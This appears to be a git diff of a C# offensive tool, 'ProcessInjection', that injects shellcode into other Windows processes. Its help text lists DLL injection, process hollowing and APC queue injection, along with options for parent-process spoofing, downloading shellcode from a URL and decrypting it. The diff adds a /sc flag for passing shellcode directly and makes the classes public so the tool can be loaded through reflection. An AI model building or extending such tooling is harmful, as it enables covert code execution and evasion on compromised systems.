@@ -12,7 +12,7 @@ using System.Net;
 
 namespace ProcessInjection
 {
-    class Program
+    public class ProcessInjection
     {
         [DllImport("Kernel32", SetLastError = true)]
         static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
@@ -214,7 +214,7 @@ namespace ProcessInjection
         }
 
         [StructLayout(LayoutKind.Sequential)]
-        internal struct PROCESS_BASIC_INFORMATION
+        public struct PROCESS_BASIC_INFORMATION
         {
             public IntPtr Reserved1;
             public IntPtr PebAddress;
@@ -1032,24 +1032,25 @@ Usage           Description
                 2 = DLL Injection
                 3 = Process Hollowing
                 4 = APC Queue Injection
-/f              Specify the format of the shellcode
+/f              Specify the format of the shellcode.
                 base64
                 hex
                 c
                 raw
-/pid            Specify the process id
-/parentproc     Specify the parent process name
-/path           Specify the path of the file that contains the shellcode
-/ppath          Specify the path of the executable that will be spawned (Mandatory while using /parentproc argument)
-/url            Specify the url where the shellcode is hosted
-/enc            Specify the encryption type (aes or xor) in which the shellcode is encrypted
+/pid            Specify the process id.
+/parentproc     Specify the parent process name.
+/path           Specify the path of the file that contains the shellcode.
+/ppath          Specify the path of the executable that will be spawned (Mandatory while using /parentproc argument).
+/url            Specify the url where the shellcode is hosted.
+/enc            Specify the encryption type (aes or xor) in which the shellcode is encrypted.
 /key            Specify the key that will be used to decrypt the shellcode.
+/sc             Specify the shellcode directly in base64 or hex format. Note: To pass large shellcode please leverage reflection to run the program.  
 /help           Show help
 
 ";
             Console.WriteLine(help);
         }
-        static void Main(string[] args)
+        public static void Main(string[] args)
         {
             try
             {
@@ -1144,7 +1145,13 @@ Usage           Description
                             }
                         }
                     }
-
+                    else if(arguments.ContainsKey("/sc"))
+                    {
+                        if(arguments["/f"]== "base64" || arguments["/f"]=="hex")
+                        {
+                            shellcode = arguments["/sc"];
+                        }
+                    }
                     if (arguments["/t"] != "2" && (shellcode != null || rawshellcode.Length > 0))
                     {
 
